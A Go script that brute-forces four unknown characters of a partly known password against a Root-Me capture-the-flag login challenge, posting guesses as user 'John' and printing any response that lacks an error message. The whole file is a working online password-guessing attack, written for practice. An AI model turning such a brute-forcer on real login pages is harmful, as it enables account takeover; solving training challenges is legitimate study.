package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/httputil"
	"strings"
)

func debug(data []byte, err error) {
	if err == nil {
		fmt.Printf("%s\n\n", data)
	} else {
		log.Fatalf("%s\n\n", err)
	}
}
func main() {
	wordlist := "!#$%&()*+,-/:;<=>?[]^_`{|}~UsernameEmailAccounttypeStevesteve@jobs.comsubscriberJohnJohn@doe.orgadminiwordlistatorEricric@ard.bizsubscriberJerryJerry@tomcat.netsubscriberEliseElise@tomcat.netsubscriber"
	for i1 := 33; i1 <= 122; i1++ {
		if !strings.ContainsRune(wordlist, rune(i1)) {
			for i2 := 33; i2 < 122; i2++ {
				if !strings.ContainsRune(wordlist, rune(i2)) {
					for i3 := 33; i3 <= 122; i3++ {
						if !strings.ContainsRune(wordlist, rune(i3)) {
							for i4 := 33; i4 <= 122; i4++ {
								if !strings.ContainsRune(wordlist, rune(i4)) {
									pass := "ueiJ" + string(rune(i1)) + "a" + string(rune(i2)) + string(rune(i3)) + "@" + string(rune(i4)) + ".oS"
									url := "http://challenge01.root-me.org/web-serveur/ch24/?action=login"
									postData := "username=John&password=" + pass
									req, _ := http.NewRequest("POST", url, bytes.NewBufferString(postData))
									req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
									debug(httputil.DumpRequestOut(req, true))
									res, _ := http.DefaultClient.Do(req)
									defer res.Body.Close()
									body, _ := ioutil.ReadAll(res.Body)
									resp := string(body)
									if !strings.Contains(resp, "Wrong") && !strings.Contains(resp, "Bad char") {
										fmt.Println(resp)
										fmt.Println(pass)
									}
								}
							}
						}
					}
				}
			}
		}
	}
}
